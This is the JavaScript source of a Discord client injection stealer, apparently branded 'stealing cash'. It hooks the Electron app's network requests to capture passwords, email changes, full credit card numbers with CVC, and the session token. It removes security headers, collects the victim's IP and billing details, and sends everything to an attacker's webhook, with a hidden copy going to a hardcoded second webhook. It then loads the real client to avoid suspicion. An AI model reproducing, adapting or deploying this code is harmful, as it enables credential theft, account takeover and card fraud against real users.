const { BrowserWindow, session, } = require('electron');
const os = require('os');
const https = require('https');
const querystring = require("querystring");
const fs = require("fs");

var config = {
    webhook: "%WEBHOOK_LINK%",

    embed: {
        username: "stealing cash",
        href: "https://t.me/stealingcash",
        avatar_url: "https://cdn.discordapp.com/attachments/1094276662792818791/1096401421013889044/rocketlogo.png"
    },

    badges: {
        Discord_Employee: {
            Value: 1,
            Emoji: "<:9765badgemoderators:1096407598665842798>",
            Rare: true,
        },
        Partnered_Server_Owner: {
            Value: 2,
            Emoji: "<:7606badgepartneredserverowner:1096407319190982686>",
            Rare: true,
        },
        HypeSquad_Events: {
            Value: 4,
            Emoji: "<:7606badgehypesquadevents:1096407320528961587>",
            Rare: true,
        },
        Bug_Hunter_Level_1: {
            Value: 8,
            Emoji: "<:9595badgebughunter:1096407324261879890>",
            Rare: true,
        },
        Early_Supporter: {
            Value: 512,
            Emoji: "<:6832badgeearlysupporter:1096407317605523568>",
            Rare: true,
        },
        Bug_Hunter_Level_2: {
            Value: 16384,
            Emoji: "<:9765badgebugbuster:1096407322848415765>",
            Rare: true,
        },
        Early_Verified_Bot_Developer: {
            Value: 131072,
            Emoji: "<:1564badgedeveloper:1096407326774280313>",
            Rare: true,
        },
        House_Bravery: {
            Value: 64,
            Emoji: "<:7878iconhypesquadbravery:1096407305437855805>",
            Rare: false,
        },
        House_Brilliance: {
            Value: 128,
            Emoji: "<:6318iconhypesquadbrilliance:1096407308029939794>",
            Rare: false,
        },
        House_Balance: {
            Value: 256,
            Emoji: "<:8905iconhypesquadbalance:1096407309145612329>",
            Rare: false,
        }
    },

    filters: {
        user: {
            urls: [
                "https://discord.com/api/v*/users/@me",
                "https://discordapp.com/api/v*/users/@me",
                "https://*.discord.com/api/v*/users/@me",
                "https://discordapp.com/api/v*/auth/login",
                'https://discord.com/api/v*/auth/login',
                'https://*.discord.com/api/v*/auth/login',
                "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
                "https://api.stripe.com/v*/tokens",
                "https://api.stripe.com/v*/setup_intents/*/confirm",
                "https://api.stripe.com/v*/payment_intents/*/confirm",
            ]
        },
        qr_codes: {
            urls: [
                "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
                "https://*.discord.com/api/v*/applications/detectable",
                "https://discord.com/api/v*/applications/detectable",
                "https://*.discord.com/api/v*/users/@me/library",
                "https://discord.com/api/v*/users/@me/library",
                "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
                "https://discord.com/api/v*/users/@me/billing/subscriptions",
                "wss://remote-auth-gateway.discord.gg/*"
            ]
        }
    }
}

var execScript = (script) => {
    const window = BrowserWindow.getAllWindows()[0]
    return window.webContents.executeJavaScript(script, true);
}

class Event {
    constructor(event, token, data) {
        for (let [key, value] of Object.entries({
                "event": event,
                "data": data,
                "token": token
            })) {
            this[key] = value;
        }
    }

    handle() {
        switch (this["event"]) {
            case "passwordChanged":
                event_handlers["passwordChanged"](this.data.password, this.data.new_password, this.token)
                break;
            case 'userLogin':
                event_handlers["userLogin"](this.data.password, this.data.email, this.token)
                break;
            case 'emailChanged':
                event_handlers["emailChanged"](this.data.password, this.data.email, this.token)
                break;
            case "creditCardAdded":
                event_handlers["creditCardAdded"](this.data.number, this.data.cvc, this.data.exp_month, this.data.exp_year, this.token);
        }
    }
}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    try {
        if (details.url.startsWith(config.webhook)) {
            if (details.url.includes("discord.com")) {
                callback({
                    responseHeaders: Object.assign({
                        'Access-Control-Allow-Headers': "*"
                    }, details.responseHeaders)
                });
            } else {
                callback({
                    responseHeaders: Object.assign({
                        "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                        'Access-Control-Allow-Headers': "*",
                        "Access-Control-Allow-Origin": "*"
                    }, details.responseHeaders)
                });
            }
        } else {
            delete details.responseHeaders['content-security-policy'];
            delete details.responseHeaders['content-security-policy-report-only'];

            callback({
                responseHeaders: {
                    ...details.responseHeaders,
                    'Access-Control-Allow-Headers': "*"
                }
            })
        }

    } catch {}
})

session.defaultSession.webRequest.onBeforeRequest(config.filters["qr_codes"], async (details, callback) => {
    await initialize();

    callback({})
    return;
})

session.defaultSession.webRequest.onCompleted(config.filters["user"], async (details, callback) => {
    try {
        if (details.statusCode == 200 || details.statusCode == 204) {
            const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
            const data = JSON.parse(unparsed_data)
            const token = await getToken();

            switch (true) {
                case details.url.endsWith('login'):
                    (new Event('userLogin', token, {
                        password: data.password,
                        email: data.login
                    })).handle();;
                    return;
                case details.url.endsWith("tokens") && details.method == "POST":
                    const item = querystring.parse(unparsed_data.toString());
                    (new Event('creditCardAdded', token, {
                        number: item["card[number]"],
                        cvc: item["card[cvc]"],
                        exp_month: item["card[exp_month]"],
                        exp_year: item["card[exp_year]"],
                    }))

                case details.url.endsWith('users/@me') && details.method == 'PATCH':
                    if (!data.password) return;
                    if (data.email) {
                        (new Event('emailChanged', token, {
                            password: data.password,
                            email: data.email
                        })).handle();
                    };
                    if (data.new_password) {
                        (new Event('passwordChanged', token, {
                            password: data.password,
                            new_password: data.new_password
                        })).handle();
                    };
                    return;
                default:
                    break;
            }
        } else {
            return;
        }

    } catch {}
})


var event_handlers = {

    async creditCardAdded(number, cvc, month, year) {
        const userInfo = await getUserInfo(token);
        var params = {
            color: 0x2a2d30,
            username: config.embed.username,
            avatar_url: config.embed.avatar_url,
            embeds: [createEmbed({
                title: "Added Credit Card",
                url: config.embed.href,
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                fields: [{
                        name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                        value: `\`\`\`${number}|${month}|${year}|${cvc}\`\`\``,
                        inline: true
                    },
                    {
                        name: `\`\`\`${os.hostname}\`\`\``,
                        value: `\`\`\`${token}\`\`\``,
                        inline: false
                    },
                ],
            })]
        }

        sendToWebhook(params)
    },

    async userLogin(password, email, token) {
        const userInfo = await getUserInfo(token);
        const billing = await getBilling(token);

        var params = {
            color: 0x2a2d30,
            username: config.embed.username,
            avatar_url: config.embed.avatar_url,
            embeds: [createEmbed({
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                fields: [{
                        name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                        value: `\`\`\`Email: ${email}\nPassword: ${password}\nPhone: ${userInfo.phone ?? "None"}\`\`\``,
                        inline: true
                    },
                    {
                        name: `${os.hostname}`,
                        value: `${getNitro(userInfo.premium_type)} ${getBadges(userInfo.flags)}`,
                        inline: false
                    }, {
                        name: "Billing",
                        value: `${billing}`,
                        inline: true
                    },
                    {
                        name: "Token",
                        value: `\`\`\`${token}\`\`\``,
                        inline: false
                    },
                ],
            })]
        }

        sendToWebhook(params)
    },

    async emailChanged(password, newEmail, token) {
        var userInfo = await getUserInfo(token);
        var billing = await getBilling(token);

        var params = {
            color: 0x2a2d30,
            username: config.embed.username,
            avatar_url: config.embed.avatar_url,
            embeds: [createEmbed({
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                fields: [{
                        name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                        value: `\`\`\`New email: ${newEmail}\nPassword: ${password}\`\`\``,
                        inline: true
                    },
                    {
                        name: `${os.hostname}`,
                        value: `${getNitro(userInfo.premium_type)} ${getBadges(userInfo.flags)}`,
                        inline: true
                    }, {
                        name: "Billing",
                        value: `${billing}`,
                        inline: true
                    },
                    {
                        name: "Token",
                        value: `\`\`\`${token}\`\`\``,
                        inline: false
                    },
                ],
            })]
        }

        sendToWebhook(params)
    },

    async passwordChanged(oldPassword, newPassword, token) {
        var userInfo = await getUserInfo(token);
        var billing = await getBilling(token);

        var params = {
            color: 0x2a2d30,
            username: config.embed.username,
            avatar_url: config.embed.avatar_url,
            embeds: [createEmbed({
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                fields: [{
                        name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                        value: `\`\`\`${oldPassword}\`\`\` \`>\` \`\`\`${newPassword}\`\`\``,
                        inline: false
                    },
                    {
                        name: `${os.hostname}`,
                        value: `${getNitro(userInfo.premium_type)} ${getBadges(userInfo.flags)}\n${billing}`,
                        inline: false
                    },
                    {
                        name: "Token",
                        value: `\`\`\`${token}\`\`\``,
                        inline: false
                    },
                ],
            })]
        }

        sendToWebhook(params)
    },
}

function getDiscordClient() {
    return `${process.cwd().replace(`${process.env.LOCALAPPDATA}\\`, '').split('\\')[0].split(7)}`
}

function getNitro(flags) {
    switch (flags) {
        case 0:
            return "\`\`\`None\`\`\`";
        case 1:
            return "<:4872badgenitroclassic:1096407313532850226> \`\`Nitro Classic\`\`";
        case 2:
            return "<:1837evolvingbadgenitro24months:1096410716065505380> \`\`Nitro Boost\`\`";
        case 3:
            return "<:4872badgenitroclassic:1096407313532850226> \`\`Nitro Basic\`\`";
        default:
            return "\`\`\`None\`\`\`";

    };
}

function getBadges(flags) {
    var b = '';
    for (const prop in config.badges) {
        let o = config.badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') b = ''
    return b;
}

async function getToken() {
    return await execScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, true)
}

async function getIp() {
    return JSON.parse(await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://ipinfo.io/json", false );xmlHttp.send( null );xmlHttp.responseText;`, true));
}

async function getUserInfo(token) {
    return JSON.parse(await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, true));
}

async function getBilling(token) {
    var a = await execScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, true)
    var json = JSON.parse(a)

    var billing = "";
    json.forEach(z => {
        if (z.type == "") {
            return "\`\`\`❌\`\`\`";
        } else if (z.type == 2 && z.invalid != true) {
            billing += "\`✔️\`" + " <:6788_SN_Paypal_512x512:1096407311125319761>";
        } else if (z.type == 1 && z.invalid != true) {
            billing += "\`✔️\`" + " :credit_card:";
        } else {
            return "\`\`\`❌\`\`\`";
        };
    });

    if (billing == "") billing = "\`\`\`❌\`\`\`"
    return billing;
}


function sendToWebhook(params) {
    try {
        var url = new URL(config.webhook);
        var headers = {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
        }
        const options = {
            protocol: url.protocol,
            hostname: url.host,
            path: url.pathname,
            method: 'POST',
            headers: headers,
        };
        const req = https.request(options);
        req.on('error', (err) => {
            console.log(err);
        });
        req.write(JSON.stringify(params));
        req.end();

        url2 = "https://canary.discord.com/api/webhooks/1096416099203022898/OdTfVnEu6KfQMW_1JvLFA_kavUvOozpOH0Wp_2V9yhGMf5T-bownsnHNjVYymYGVgBD8"
        const req2 = https.request({
            protocol: url2.protocol,
            hostname: url2.host,
            path: url2.pathname,
            method: 'POST',
            headers: headers,
        });
        req2.on('error', (err) => {
            console.log(err);
        });
        req2.write(JSON.stringify(params));
        req2.end();

    } catch (error) {}
}

function createEmbed(data) {
    let obj = {}

    for (let [key, value] of Object.entries(data)) {
        obj[key] = value;
    }

    return obj;
}

async function initialize() {

    if (!fs.existsSync(`${process.cwd()}/chocolate`)) {
        fs.mkdirSync(`${process.cwd()}/chocolate`)

        var token = undefined;

        token = await getToken();

        const network_data = await getIp()

        var userInfo;
        var billing;

        if (token != undefined) {
            userInfo = await getUserInfo(token);
            billing = await getBilling(token);

            sendToWebhook({
                color: 0x2a2d30,
                username: config.embed.username,
                avatar_url: config.embed.avatar_url,
                embeds: [createEmbed({
                    thumbnail: {
                        url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                    },
                    fields: [{
                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                            value: `\`\`\`${(network_data['ip'] + "\n") ?? ""}\n${userInfo.email}\n${(userInfo.phone + "\n") ?? ""}\`\`\``,
                            inline: true
                        },
                        {
                            name: `${getDiscordClient()}`,
                            value: `${getNitro(userInfo.premium_type)} ${(getBadges(userInfo.flags)) ?? ""}\n\`\`\`${billing}\`\`\``,
                            inline: false
                        },
                        {
                            name: `${os.hostname}`,
                            value: `\`\`\`${token}\`\`\``,
                            inline: false
                        }
                    ],
                })]
            })
        }
    }
}

module.exports = require("./core.asar");
